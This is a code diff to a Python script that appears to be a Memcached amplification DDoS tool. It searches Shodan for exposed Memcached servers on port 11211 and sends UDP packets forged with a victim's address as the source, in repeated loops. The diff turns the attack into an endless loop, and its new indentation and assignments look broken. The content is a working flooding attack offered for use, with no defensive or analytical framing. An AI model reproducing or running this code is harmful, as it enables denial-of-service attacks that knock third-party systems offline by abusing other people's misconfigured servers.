@@ -99,75 +99,39 @@ while True:
                             print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                             with suppress_stdout():
                                 send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                print('100')
+                print('')
+                print('0.0')
+                print('')
+                
+                while True:
+            results = api.search('-has_ipv6:true product:"Memcached" port:11211')
 
-                results = api.search('-has_ipv6:true product:"Memcached" port:11211')
+            engage = y
+            if engage.startswith('y'):
+                if saveme.startswith('y'):
+                    for i in ip_array:
+                        if power>1:
+                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))
+                            with suppress_stdout():
+                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
+                        elif power==1:
+                            print('[+] Sending 1 forged UDP packet to: %s' % i)
+                            with suppress_stdout():
+                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
+                else:
+                    for result in results['matches']:
+                        if power>1:
+                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                            with suppress_stdout():
+                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                        elif power==1:
+                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                            with suppress_stdout():
+                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
                 print('')
-                for result in results['matches']:
-                    if power>1:
-                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                    elif power==1:
-                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                print('200')
-    
-                results = api.search('-has_ipv6:true port:11211 product:"Memcached"')
+                print('0.0')
                 print('')
-                for result in results['matches']:
-                    if power>1:
-                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                    elif power==1:
-                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                print('300')
 
-                results = api.search('product:"Memcached" -has_ipv6:true port:11211')
-                print('')
-                for result in results['matches']:
-                    if power>1:
-                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                    elif power==1:
-                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                print('400')
-    
-                results = api.search('port:11211 -has_ipv6:true product:"Memcached"')
-                print('')
-                for result in results['matches']:
-                    if power>1:
-                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                    elif power==1:
-                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                print('500')
-
-                results = api.search('port:11211 product:"Memcached" -has_ipv6:true')
-                print('')
-                for result in results['matches']:
-                    if power>1:
-                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                    elif power==1:
-                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                        with suppress_stdout():
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                print('600')
-
-                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
-                break
             else:
                 print('')
                 print('[✘] Error: %s not engaged!' % target)
